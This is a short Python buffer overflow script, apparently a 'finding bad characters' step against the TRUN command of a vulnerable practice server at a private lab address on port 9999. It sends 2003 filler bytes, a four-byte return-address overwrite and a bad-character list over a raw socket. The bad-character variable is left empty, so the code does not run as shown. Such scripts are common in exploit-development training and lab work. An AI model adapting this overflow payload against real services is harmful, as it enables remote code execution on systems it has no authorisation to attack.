#!/usr/bin/python

#Finding Bad Characters 
import sys, socket

badChars=

shellcode= "A"*2003+"B"*4+badChars

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.4',9999))
        s.send(('TRUN /.:/'+shellcode))
        s.close()
        
except:
        print ("Error connecting to server") 
        sys.exit()